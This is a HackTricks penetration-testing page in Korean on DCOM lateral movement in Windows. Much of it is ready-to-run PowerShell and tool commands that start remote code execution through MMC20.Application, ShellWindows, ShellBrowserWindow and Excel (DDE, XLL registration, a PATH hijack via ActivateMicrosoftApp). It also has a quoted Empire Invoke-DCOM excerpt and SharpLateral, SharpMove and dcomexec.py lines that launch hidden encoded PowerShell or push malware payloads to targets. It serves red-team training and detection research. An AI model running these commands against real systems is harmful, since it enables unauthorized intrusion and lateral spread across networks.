# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement는 service 또는 scheduled task를 생성하는 대신 RPC/DCOM을 통해 노출된 기존 COM servers를 재사용하기 때문에 매력적입니다. 실제로 이는 initial connection이 일반적으로 TCP/135에서 시작한 다음 동적으로 할당된 high RPC ports로 이동한다는 의미입니다.

## 사전 요구 사항 및 주의 사항

- 일반적으로 target에서 local administrator context가 필요하며, remote COM server는 remote launch/activation을 허용해야 합니다.
- **2023년 3월 14일**부터 Microsoft는 지원되는 시스템에 DCOM hardening을 적용합니다. 낮은 activation authentication level을 요청하는 오래된 clients는 최소 `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` 이상으로 negotiate하지 않으면 실패할 수 있습니다. 최신 Windows clients는 일반적으로 자동으로 상향 조정되므로 현재 tooling은 대개 계속 작동합니다.<sup>[[3]](#references)</sup>
- Manual 또는 scripted DCOM execution에는 일반적으로 TCP/135와 target의 dynamic RPC port range가 필요합니다. Impacket의 `dcomexec.py`를 사용하고 command output을 반환받으려면 일반적으로 `ADMIN$`(또는 쓰기/읽기가 가능한 다른 share)에 대한 SMB access도 필요합니다.
- RPC/DCOM은 작동하지만 SMB가 차단된 경우에도 `dcomexec.py -nooutput`은 blind execution에 유용할 수 있습니다.

간단한 확인 사항:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

이 technique에 대한 자세한 내용은 [original MMC20.Application post](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)를 참고하세요.<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects는 네트워크 기반 object 상호 작용을 위한 흥미로운 기능을 제공합니다. Microsoft는 DCOM과 Component Object Model (COM)에 대한 포괄적인 documentation을 제공하며, [DCOM 관련 문서](https://msdn.microsoft.com/en-us/library/cc226801.aspx)와 [COM 관련 문서](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)에서 확인할 수 있습니다. DCOM applications 목록은 다음 PowerShell command를 사용하여 가져올 수 있습니다:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object인 [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)은 MMC snap-in 작업을 scripting할 수 있게 합니다. 특히 이 object에는 `Document.ActiveView` 아래에 `ExecuteShellCommand` method가 포함되어 있습니다. 이 method에 대한 자세한 정보는 [여기](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)에서 확인할 수 있습니다. 다음을 실행하여 확인합니다:<sup>[[6]](#references)</sup>

이 기능을 사용하면 DCOM application을 통해 network에서 commands를 실행할 수 있습니다. admin으로 DCOM과 원격으로 상호 작용하려면 다음과 같이 PowerShell을 사용할 수 있습니다:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
이 명령은 DCOM application에 연결하고 COM object의 인스턴스를 반환합니다. 그런 다음 ExecuteShellCommand method를 호출하여 원격 호스트에서 process를 실행할 수 있습니다. process는 다음 단계로 진행됩니다:

메서드 확인:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE 획득:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
마지막 인수는 window style입니다. `7`은 window를 minimized 상태로 유지합니다. 운영 측면에서 MMC 기반 execution은 일반적으로 원격 `mmc.exe` process가 payload를 spawn하도록 하며, 이는 아래의 Explorer 기반 objects와 다릅니다.

## ShellWindows & ShellBrowserWindow

**이 technique에 대한 자세한 정보는 original post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** object에는 명시적인 "LaunchPermissions"가 없으며, Administrators의 access를 허용하는 permissions로 default 설정되는 것이 확인되었습니다. 자세한 내용은 [여기](https://twitter.com/tiraniddo/status/817532039771525120)의 thread에서 확인할 수 있으며, 명시적인 Launch Permission이 없는 objects를 filtering하기 위해 [@tiraniddo](https://twitter.com/tiraniddo)의 OleView .NET을 사용하는 것이 권장됩니다.

두 개의 특정 objects인 `ShellBrowserWindow`와 `ShellWindows`는 명시적인 Launch Permissions가 없기 때문에 주목받았습니다. `HKCR:\AppID\{guid}` 아래에 `LaunchPermission` registry entry가 없다는 것은 명시적인 permissions가 없음을 의미합니다.

`MMC20.Application`과 비교하면, 이러한 objects는 command가 원격 host에서 `mmc.exe` 대신 일반적으로 `explorer.exe`의 child로 실행되기 때문에 OPSEC 측면에서 더 조용한 경우가 많습니다.

### ShellWindows

ProgID가 없는 `ShellWindows`의 경우, .NET methods인 `Type.GetTypeFromCLSID`와 `Activator.CreateInstance`를 사용하여 AppID로 object를 instantiate할 수 있습니다. 이 process에서는 OleView .NET을 사용하여 `ShellWindows`의 CLSID를 가져옵니다. object가 instantiate되면 `WindowsShell.Item` method를 통해 interaction할 수 있으며, `Document.Application.ShellExecute`와 같은 method invocation으로 이어집니다.

object를 instantiate하고 원격으로 commands를 execute하기 위한 PowerShell commands example이 제공되었습니다:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow`은 유사하지만, CLSID를 통해 직접 인스턴스화한 후 `Document.Application.ShellExecute`로 pivot할 수 있습니다:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objects를 이용한 Lateral Movement

DCOM Excel objects를 exploit하여 Lateral Movement를 수행할 수 있습니다. 자세한 내용은 [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)의 DCOM을 통한 Lateral Movement를 위해 Excel DDE를 활용하는 방법에 대한 글을 읽어보는 것이 좋습니다.<sup>[[5]](#references)</sup>

Empire project는 DCOM objects를 조작하여 Excel을 통한 remote code execution (RCE)을 수행하는 방법을 보여주는 PowerShell script를 제공합니다. 아래는 Excel을 악용하여 RCE를 수행하는 다양한 방법을 보여주는 [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)의 script 일부입니다:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
최근 연구에서는 `Excel.Application`의 `ActivateMicrosoftApp()` 메서드를 사용하여 이 영역을 확장했습니다. 핵심 아이디어는 Excel이 시스템 `PATH`를 검색하여 FoxPro, Schedule Plus 또는 Project와 같은 레거시 Microsoft 애플리케이션을 실행하려고 한다는 것입니다. 오퍼레이터가 대상의 `PATH`에 포함된 쓰기 가능한 위치에 이러한 예상 이름 중 하나를 가진 payload를 배치할 수 있다면 Excel이 이를 실행합니다.<sup>[[4]](#references)</sup>

이 변형의 요구 사항:

- 대상에서 Local admin 권한
- 대상에 Excel 설치
- 대상의 `PATH`에 포함된 쓰기 가능한 디렉터리에 payload를 작성할 수 있는 권한

FoxPro lookup (`FOXPROW.exe`)을 악용하는 실제 예:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
공격 호스트에 로컬 `Excel.Application` ProgID가 등록되어 있지 않다면, 대신 CLSID를 사용해 원격 객체를 인스턴스화합니다:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
실제 악용 사례에서 확인된 값:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Lateral Movement용 Automation Tools

이러한 기법을 자동화하기 위한 두 가지 도구가 소개되어 있습니다:

- **Invoke-DCOM.ps1**: 원격 시스템에서 code를 실행하기 위한 다양한 방법의 호출을 간소화하는 Empire 프로젝트의 PowerShell script입니다. 이 script는 Empire GitHub repository에서 이용할 수 있습니다.

- **SharpLateral**: 원격으로 code를 실행하기 위한 tool이며, 다음 command와 함께 사용할 수 있습니다:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 자동화 도구

- [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) Powershell script를 사용하면 주석으로 설명된 모든 방식으로 다른 시스템에서 code를 쉽게 실행할 수 있습니다.
- Impacket의 `dcomexec.py`를 사용하면 DCOM을 통해 remote system에서 command를 실행할 수 있습니다. 현재 빌드는 `ShellWindows`, `ShellBrowserWindow`, `MMC20`을 지원하며, 기본값은 `ShellWindows`입니다.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- [**SharpLateral**](https://github.com/mertdas/SharpLateral)도 사용할 수 있습니다:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [**SharpMove**](https://github.com/0xthirteen/SharpMove)도 사용할 수 있습니다
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [MMC20.Application COM Object를 사용한 Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM을 통한 Lateral Movement: 2라운드](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass(CVE-2021-26414)에 대한 변경 사항 관리](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel Application의 강력한 기능 악용](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM을 통한 Lateral Movement를 위한 Excel DDE 활용](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
{{#include ../../banners/hacktricks-training.md}}
